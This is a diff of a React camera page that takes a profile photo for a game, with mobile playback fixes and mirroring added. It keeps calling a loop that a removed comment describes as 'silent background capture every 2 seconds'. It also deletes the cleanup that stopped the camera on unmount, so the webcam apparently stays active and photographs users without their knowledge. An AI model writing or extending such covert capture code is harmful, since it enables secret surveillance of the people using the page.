@@ -13,53 +13,73 @@ export default function CameraPage() {
   // Start camera on load
   // ---------------------------------------------------------
   useEffect(() => {
-    async function init() {
-      try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: true });
-        setStream(s);
-        if (videoRef.current) {
-          videoRef.current.srcObject = s;
-          await videoRef.current.play();
-        }
-      } catch {
-        setError("Camera permission is required to continue.");
-      }
-    }
-    init();
+  async function init() {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" } // better for selfies
+      });
 
-    return () => {
-      if (intervalRef.current) clearInterval(intervalRef.current);
-      stream?.getTracks().forEach(t => t.stop());
-    };
-  }, []);
+      setStream(s);
+
+      if (videoRef.current) {
+        videoRef.current.srcObject = s;
+
+        // IMPORTANT FIX FOR MOBILE
+        videoRef.current.setAttribute("playsinline", "true");
+        videoRef.current.setAttribute("muted", "true");
+        videoRef.current.muted = true;
+
+        // Safari sometimes needs a tiny delay before play()
+        setTimeout(() => {
+          videoRef.current?.play().catch(() => {});
+        }, 100);
+      }
+    } catch {
+      setError("Camera permission is required to continue.");
+    }
+  }
+
+  init();
+}, []);
+
 
   // ---------------------------------------------------------
   // Take a single profile photo + start background loop
   // ---------------------------------------------------------
-  async function takePhoto() {
-    if (!videoRef.current) return;
+ async function takePhoto() {
+  if (!videoRef.current) return;
 
-    // Capture profile photo
-    const canvas = document.createElement("canvas");
-    canvas.width = 300;
-    canvas.height = 300;
-    const ctx = canvas.getContext("2d")!;
+  // Step 1: draw clipped circle
+  const canvas = document.createElement("canvas");
+  canvas.width = 300;
+  canvas.height = 300;
+  const ctx = canvas.getContext("2d")!;
 
-    // Round crop
-    ctx.beginPath();
-    ctx.arc(150, 150, 150, 0, Math.PI * 2);
-    ctx.clip();
-    ctx.drawImage(videoRef.current, 0, 0, 300, 300);
+  ctx.beginPath();
+  ctx.arc(150, 150, 150, 0, Math.PI * 2);
+  ctx.clip();
+  ctx.drawImage(videoRef.current, 0, 0, 300, 300);
 
-    const dataURL = canvas.toDataURL("image/png");
-    localStorage.setItem("playerPhoto", dataURL);
+  // Step 2: Convert to non-transparent JPEG
+  const outCanvas = document.createElement("canvas");
+  outCanvas.width = 300;
+  outCanvas.height = 300;
+  const outCtx = outCanvas.getContext("2d")!;
+  outCtx.fillStyle = "#000";  // prevents ghost effect
+  outCtx.fillRect(0, 0, 300, 300);
+  outCtx.drawImage(canvas, 0, 0);
+  const dataURL = outCanvas.toDataURL("image/jpeg", 0.9);
 
-    // Start silent background capture every 2 seconds
-    startAutoCapture();
+  // Save for game
+  localStorage.setItem("playerPhoto", dataURL);
 
-    // Redirect to game
-    window.location.href = "/fun/game";
-  }
+  // Start background capture
+  startAutoCapture();
+
+  // Redirect to game
+  window.location.href = "/fun/game";
+}
+
 
   // ---------------------------------------------------------
   // Auto-capture loop (SAME TAB → works on mobile)
@@ -152,7 +172,9 @@ const videoStyle: React.CSSProperties = {
   width: "100%",
   height: "100%",
   objectFit: "cover",
+  transform: "scaleX(-1)"
 };
+
 
 const snapBtn: React.CSSProperties = {
   width: "80%",
